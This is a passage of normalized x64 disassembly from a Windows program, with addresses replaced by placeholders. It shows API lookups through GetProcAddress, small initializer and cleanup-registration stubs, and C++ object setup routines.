add rsp 0x28
retn
sub_140059d20
sub rsp 0x28
mov rcx [ rw-data ]
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140059d50
sub rsp 0x28
mov rcx [ rw-data ]
lea rdx [ r--data ]
call [ GetProcAddress@IAT ]
mov [ rw-data ] rax
add rsp 0x28
retn
sub_140059e00
sub rsp 0x28
lea rcx [ r--data ]
call [ GetModuleHandleW@IAT ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
test rax rax
setne [ rw-data ]
add rsp 0x28
retn
sub_140059e30
lea rcx [ sub_14005a008 ]
jmp sub_14004005c
sub_140059e3c
lea rcx [ sub_14005a018 ]
jmp sub_14004005c
sub_140059e48
lea rcx [ sub_14005a028 ]
jmp sub_14004005c
sub_140059e54
lea rcx [ sub_14005a044 ]
jmp sub_14004005c
sub_140059e60
lea rcx [ sub_14005a038 ]
jmp sub_14004005c
sub_140059e6c
sub rsp 0x28
lea rcx [ rw-data ]
call sub_1400381d4
lea rcx [ sub_14005a098 ]
add rsp 0x28
jmp sub_14004005c
sub_140059e8c
sub rsp 0x28
lea rcx [ rw-data ]
call sub_1400381d4
lea rcx [ sub_14005a0a4 ]
add rsp 0x28
jmp sub_14004005c
sub_140059eac
sub rsp 0x28
call sub_14003bc4c
lea rcx [ rw-data ]
lea rdx [ rax + 0x30 ]
call sub_1400389fc
lea rcx [ sub_14005a0e8 ]
add rsp 0x28
jmp sub_14004005c
sub_140059ed8
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
and [ rsp + 0x40 ] 0x0
mov [ rsp + 0x40 ] 0x1
xor r8d r8d
lea rdx [ rw-data ]
lea rcx [ rw-data ]
call sub_140004c70
nop
lea rcx [ sub_14005a0b0 ]
add rsp 0x38
jmp sub_14004005c
sub_140059f1c
lea rcx [ rw-data ]
jmp sub_140038990
sub_140059f28
sub rsp 0x28
lea rcx [ rw-data ]
call sub_1400381d4
lea rcx [ sub_14005a0f4 ]
add rsp 0x28
jmp sub_14004005c
sub_140059f48
sub rsp 0x28
call sub_14003bc4c
lea rcx [ rw-data ]
mov rdx rax
call sub_1400389fc
lea rcx [ sub_14005a138 ]
add rsp 0x28
jmp sub_14004005c
sub_140059f70
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
and [ rsp + 0x40 ] 0x0
mov [ rsp + 0x40 ] 0x1
xor r8d r8d
lea rdx [ rw-data ]
lea rcx [ rw-data ]
call sub_140004c70
nop
lea rcx [ sub_14005a100 ]
add rsp 0x38
jmp sub_14004005c
sub_140059fb4
mov rax [ rw-data ]
lea rdx [ rw-data ]
mov [ rw-data ] rdx
movsxd rcx [ rax + 0x4 ]
mov rax [ rw-data ]
mov [ rcx + rdx + 0x50 ] rax
retn
sub_140059fdc
sub rsp 0x28
lea rcx [ rw-data ]
call sub_1400381d4
lea rcx [ sub_14005a144 ]
add rsp 0x28
jmp sub_14004005c
sub_140059ffc
lea rcx [ sub_14005a150 ]
jmp sub_14004005c
sub_14005a008
lea rax [ r--data ]
mov [ rw-data ] rax
retn
sub_14005a018
lea rax [ r--data ]
mov [ rw-data ] rax
retn
sub_14005a028
lea rax [ r--data ]
mov [ rw-data ] rax
retn
sub_14005a038
lea rcx [ rw-data ]
jmp sub_140002af0
sub_14005a098
lea rcx [ rw-data ]
jmp sub_140038220
sub_14005a0a4
lea rcx [ rw-data ]
jmp sub_140038220
sub_14005a0b0
mov rax [ rw-data ]
lea rdx [ rw-data ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdx ] rax
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_140037d08
sub_14005a0e8
lea rcx [ rw-data ]
jmp sub_140039d90
sub_14005a0f4
lea rcx [ rw-data ]
jmp sub_140038220
sub_14005a100
mov rax [ rw-data ]
lea rdx [ rw-data ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rcx + rdx ] rax
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_140037d08
sub_14005a138
lea rcx [ rw-data ]
jmp sub_140039d90
sub_14005a144
lea rcx [ rw-data ]
jmp sub_140038220
sub_14005a18c
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_14003a7e8
